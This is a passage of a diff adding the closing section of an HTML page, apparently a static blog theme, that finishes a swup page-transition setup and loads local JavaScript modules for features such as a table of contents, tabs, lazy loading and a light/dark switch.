+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
